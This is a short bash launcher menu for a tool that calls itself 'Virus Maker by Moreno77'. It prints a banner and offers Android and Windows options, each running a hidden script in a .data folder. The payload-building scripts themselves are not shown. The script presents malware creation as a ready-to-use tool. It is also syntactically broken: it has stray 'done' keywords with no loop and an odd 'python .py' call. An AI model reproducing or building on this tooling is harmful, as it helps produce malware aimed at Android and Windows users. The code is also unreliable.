clear
echo "\n\n\n\033[1;32m      +---------[ Virus Maker by Moreno77 ]----------+"
python .py
sleep 1
echo "\033[1;32m 1. Android"
echo "\033[1;32m 2. Windows"
echo "\033[1;32m 00. Exit"
read -p " [?] Input => " pil;
case $pil in
1) cd .data
sh 1.sh
exit
;;
2) cd .data
sh 2.sh
exit
;;
00) exit
;;
esac
done
done
